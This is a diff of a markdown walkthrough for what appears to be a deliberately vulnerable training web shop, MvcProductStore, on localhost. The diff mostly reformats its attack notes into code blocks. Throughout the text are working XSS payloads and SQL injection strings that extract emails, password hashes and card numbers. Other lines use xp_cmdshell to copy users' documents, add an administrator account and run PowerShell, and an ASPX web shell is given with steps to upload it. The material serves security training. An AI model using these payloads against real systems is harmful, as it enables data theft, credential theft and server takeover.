@@ -59,10 +59,10 @@ Try different logins to try and brute force. This is a slow process even using a
 	```
 
 	<%@ Page Language="C#" %>
-<%@ Import Namespace="System.Diagnostics" %>
+	<%@ Import Namespace="System.Diagnostics" %>
 
-<%= 
-    Process.Start(new ProcessStartInfo("cmd","/c " + Request["c"])
+	<%= 
+		Process.Start(new ProcessStartInfo("cmd","/c " + Request["c"])
                     {
                         UseShellExecute = false,
                         RedirectStandardOutput = true
@@ -96,9 +96,10 @@ Try different logins to try and brute force. This is a slow process even using a
 	> curl.exe http://localhost:50881/Store/Search  This will fail because only POST methods are supported
 	> curl.exe -X POST http://localhost:50881/Store/Search --data 'q=hugo'  This also fails because we need a XSRF token.
 
-	Try manually posting on the web page:
-	
-> Here are some examples that might get you started:
+	Try manually posting on the web page. Here are some examples that might get you started:
+
+	```
+
     ' OR 1=1 UNION SELECT 99, @@version, 'http://foo.gif' --
 	x' UNION SELECT 99, @@version, 'http://foo.gif' --
     x' UNION SELECT 99, system_user, 'http://foo.gif' --
@@ -123,8 +124,7 @@ Try different logins to try and brute force. This is a slow process even using a
 
 	Displays top 1 credit card number
 	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT TOP 1 'CardNo:' + LTRIM(RTRIM(CardNumber)) + '/expdate' + LTRIM(RTRIM(ExpDate)) + '/cvc' + LTRIM(RTRIM(CVC)) + '/' + LTRIM(RTRIM(CardHolderName)) FROM CreditCards) as varchar(4096))) --
-		
-	
+			
 	If xp_cmdshell is available try:
 	x'; exec master..xp_cmdshell 'copy %HOMESHARE%\Fakturaer\*.pdf C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads'; --
 	x'; exec master..xp_cmdshell 'xcopy %HOMESHARE%\Documents\*.docx C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads /sy'; -- (copies all doc files in folders and subfolders and overwrites if need be)
@@ -152,7 +152,7 @@ Try different logins to try and brute force. This is a slow process even using a
 	More fun with powershell. See what services are running on the server:
 	x'; DECLARE @cmd sysname, @var sysname;SET @var = 'PowerShell.exe -noprofile Get-Service';SET @cmd = @var + ' > C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\services.txt';EXEC master..xp_cmdshell @cmd; --
 	
-
+	```
 
 
 
@@ -200,89 +200,106 @@ On the front page is a box for user reviews. It seems you can paste almost anyth
 
 Things to try https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection:
           
-           Basic payload
-            <script>alert('XSS')</script>
-            <scr<script>ipt>alert('XSS')</scr<script>ipt>
-            "><script>alert('XSS')</script>
-            "><script>alert(String.fromCharCode(88,83,83))</script>
-                    
-           Img payload
-            <img src=x onerror=alert('XSS');>
-            <img src=x onerror=alert('XSS')//
-            <img src=x onerror=alert(String.fromCharCode(88,83,83));>
-            <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
-            <img src=x:alert(alt) onerror=eval(src) alt=xss>
-            "><img src=x onerror=alert('XSS');>
-            "><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+Basic payload
+
+```
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+"><script>alert('XSS')</script>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+```
+
+Img payload
+
+```
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert('XSS')//
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+
+```
+
 
 ### SQL injection
 Try if you can inject some code in the search field.
 Here are some examples that might get you started:
-    ' OR 1=1 UNION SELECT 99, @@version, 'http://foo.gif' --
-	x' UNION SELECT 99, @@version, 'http://foo.gif' --
-    x' UNION SELECT 99, system_user, 'http://foo.gif' --
-	x' UNION SELECT 99, name, 'http://foo.gif' FROM master..sysdatabases -- (all databases)    
-	x' UNION SELECT 99, DB_NAME(), 'http://foo.gif' --  (database name)
-	x' UNION SELECT 99, name, 'http://foo.gif' FROM MvcProductStore..sysobjects WHERE xtype = 'U' -- (all tables)    
+
+```
+
+' OR 1=1 UNION SELECT 99, @@version, 'http://foo.gif' --
+x' UNION SELECT 99, @@version, 'http://foo.gif' --
+x' UNION SELECT 99, system_user, 'http://foo.gif' --
+x' UNION SELECT 99, name, 'http://foo.gif' FROM master..sysdatabases -- (all databases)    
+x' UNION SELECT 99, DB_NAME(), 'http://foo.gif' --  (database name)
+x' UNION SELECT 99, name, 'http://foo.gif' FROM MvcProductStore..sysobjects WHERE xtype = 'U' -- (all tables)    
     
-    x' UNION SELECT 99, name, 'http://foo.gif' FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'AspNetUsers') -- (column names in table)
-	x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT Email FROM AspNetUsers) AS C -- (get emails)
-	x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT PasswordHash FROM AspNetUsers) AS C -- (get PasswordHash)
-	x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT SecurityStamp FROM AspNetUsers) AS C -- (get SecurityStamp)
+x' UNION SELECT 99, name, 'http://foo.gif' FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'AspNetUsers') -- (column names in table)
+x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT Email FROM AspNetUsers) AS C -- (get emails)
+x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT PasswordHash FROM AspNetUsers) AS C -- (get PasswordHash)
+x' UNION SELECT 99, C.*, 'http://foo.gif' FROM (SELECT SecurityStamp FROM AspNetUsers) AS C -- (get SecurityStamp)
 
-	Error based injection (will display server error)
-	x' AND 1 IN (SELECT @@version) --
-	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT 1) as varchar(4096))) -- (replace select statement with the sql you want to execute)
-	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT TOP 1 Email FROM Orders) as varchar(4096))) --
-	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT TOP 1 'CardNo:' + LTRIM(RTRIM(CardNumber)) + '/expdate' + LTRIM(RTRIM(ExpDate)) + '/cvc' + LTRIM(RTRIM(CVC)) + '/' + LTRIM(RTRIM(CardHolderName)) FROM CreditCards) as varchar(4096))) --
+Error based injection (will display server error)
+x' AND 1 IN (SELECT @@version) --
+x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT 1) as varchar(4096))) -- (replace select statement with the sql you want to execute)
+x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT TOP 1 Email FROM Orders) as varchar(4096))) --
+x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT TOP 1 'CardNo:' + LTRIM(RTRIM(CardNumber)) + '/expdate' + LTRIM(RTRIM(ExpDate)) + '/cvc' + LTRIM(RTRIM(CVC)) + '/' + LTRIM(RTRIM(CardHolderName)) FROM CreditCards) as varchar(4096))) --
 
-	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT Email FROM (SELECT ROW_NUMBER() OVER(ORDER BY OrderId) AS RoNum, OrderId, Email FROM Orders) AS tbl WHERE RoNum = 3) as varchar(4096))) --
+x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT Email FROM (SELECT ROW_NUMBER() OVER(ORDER BY OrderId) AS RoNum, OrderId, Email FROM Orders) AS tbl WHERE RoNum = 3) as varchar(4096))) --
 
-	
+```
 
-	If xp_cmdshell is not available try:
+If xp_cmdshell is not available try:
 
+```
 	EXEC sp_configure 'show advanced options', 1;
 	RECONFIGURE;
 	EXEC sp_configure 'xp_cmdshell', 1;
 	RECONFIGURE;
 
-	Then try this	
-	x'; exec master..xp_cmdshell 'copy %HOMESHARE%\Fakturaer\*.pdf C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads'; --
-	x'; exec master..xp_cmdshell 'xcopy %HOMESHARE%\*.doc C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads /sy'; -- (copies all doc files in folders and subfolders and overwrites if need be)
+```
 
-	Output is not shown as this is a blind injection.
+Then try this	
 
-	x'; exec master..xp_cmdshell 'whoami.exe'; -- (current username)
-	x'; exec master..xp_cmdshell 'cd'; -- (print working directory)
+```
+x'; exec master..xp_cmdshell 'copy %HOMESHARE%\Fakturaer\*.pdf C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads'; --
+x'; exec master..xp_cmdshell 'xcopy %HOMESHARE%\*.doc C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads /sy'; -- (copies all doc files in folders and subfolders and overwrites if need be)
 
-	Add administrator
-	exec master..xp_cmdshell 'net user foobar Password123 /add'; -- 
-	exec master..xp_cmdshell 'net localgroups "Administrators" /add'; --
+Output is not shown as this is a blind injection.
 
-	The above command adds a new local administrator to the remote server. That might help. 
-	Alternatively you can redirect the output of the executed command to a database table and read the contents of the table through SQL injection!
-	You can create a table and store the output of a command to it with the following:
+x'; exec master..xp_cmdshell 'whoami.exe'; -- (current username)
+x'; exec master..xp_cmdshell 'cd'; -- (print working directory)
 
-	; create table #output (id int identity(1,1), output nvarchar(255) null);
-	; insert #output (output) exec @rc = master..xp_cmdshell 'dir c:\';
-	; select * from #output where output is not null order by id;
+Add administrator
+exec master..xp_cmdshell 'net user foobar Password123 /add'; -- 
+exec master..xp_cmdshell 'net localgroups "Administrators" /add'; --
 
-	Example create new table and dump contents of c drive to table
-	x'; create table hacker (id int identity(1,1), output nvarchar(255) null); --
-	x'; declare @rc nvarchar(255); insert into hacker (output) exec @rc = master..xp_cmdshell 'dir c:\'; --		
-	x'; declare @rc nvarchar(255); insert into hacker (output) exec @rc = master..xp_cmdshell 'dir C:\Users\jrn\Desktop'; --			
-	x' union select 99, output, 'http://foo.gif' from hacker where output is not null --
-	x'; drop table hacker --
+The above command adds a new local administrator to the remote server. That might help. 
+Alternatively you can redirect the output of the executed command to a database table and read the contents of the table through SQL injection!
+You can create a table and store the output of a command to it with the following:
 
-	Or combine this with the file upload vulnerability (see next section).
+; create table #output (id int identity(1,1), output nvarchar(255) null);
+; insert #output (output) exec @rc = master..xp_cmdshell 'dir c:\';
+; select * from #output where output is not null order by id;
+
+Example create new table and dump contents of c drive to table
+x'; create table hacker (id int identity(1,1), output nvarchar(255) null); --
+x'; declare @rc nvarchar(255); insert into hacker (output) exec @rc = master..xp_cmdshell 'dir c:\'; --		
+x'; declare @rc nvarchar(255); insert into hacker (output) exec @rc = master..xp_cmdshell 'dir C:\Users\jrn\Desktop'; --			
+x' union select 99, output, 'http://foo.gif' from hacker where output is not null --
+x'; drop table hacker --
+
+Or combine this with the file upload vulnerability (see next section).
 	
-	This prints the contents of local folder to dir_out.txt file
-	x'; DECLARE @cmd sysname, @var sysname;SET @var = 'dir ..\..\..\..\ /p';SET @cmd = @var + ' > C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\dir_out.txt';EXEC master..xp_cmdshell @cmd; --
+This prints the contents of local folder to dir_out.txt file
+x'; DECLARE @cmd sysname, @var sysname;SET @var = 'dir ..\..\..\..\ /p';SET @cmd = @var + ' > C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\dir_out.txt';EXEC master..xp_cmdshell @cmd; --
 
-	More fun with powershell. See what services are running on the server:
-	x'; DECLARE @cmd sysname, @var sysname;SET @var = 'PowerShell.exe -noprofile Get-Service';SET @cmd = @var + ' > C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\dir_out.txt';EXEC master..xp_cmdshell @cmd; --
+More fun with powershell. See what services are running on the server:
+x'; DECLARE @cmd sysname, @var sysname;SET @var = 'PowerShell.exe -noprofile Get-Service';SET @cmd = @var + ' > C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\dir_out.txt';EXEC master..xp_cmdshell @cmd; --
 	
+```
 
 ### File Upload
 Customer service page has upload functionality which saves files in Uploads folder. Could be exploited for 
@@ -291,6 +308,8 @@ reverse shell upload. Seems like anything can be uploaded and directory browsing
 If we can get access to the server it's easy to upload your own shell code and have the website execute it.
 
 Try creating a file called shell.aspx with this content
+
+```
 
 <%@ Page Language="C#" %>
 <%@ Import Namespace="System.Diagnostics" %>
@@ -301,10 +320,11 @@ Try creating a file called shell.aspx with this content
                         UseShellExecute = false,
                         RedirectStandardOutput = true
                     }).StandardOutput.ReadToEnd()    
-    
     %>
-	
-	Upload it to contact us page as attachment shell.aspx.
+
+```
+
+Upload it to contact us page as attachment shell.aspx.
 
 Then type 
 http://localhost:50881/Uploads/shell.aspx?copy %HOMESHARE%\Fakturaer\*.pdf C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads
@@ -313,7 +333,6 @@ Then check content of Uploads directory.
 
 If the above fails then there is a Shell method in the StoreManager controller /StoreManager/Shell. Check it out. 
 Also another shell in the root /shell.aspx?c="COMMAND HERE". 
-
 
 
 #### Usefull commands:
@@ -366,7 +385,7 @@ git push origin master  # push changes to remote repo
 ### Clone
 
 ```
-cd into 'MvcProductStore' dir
+cd into local dir where you want to clone this repo
 git clone <remote>          # clone remote repo
 
 ```
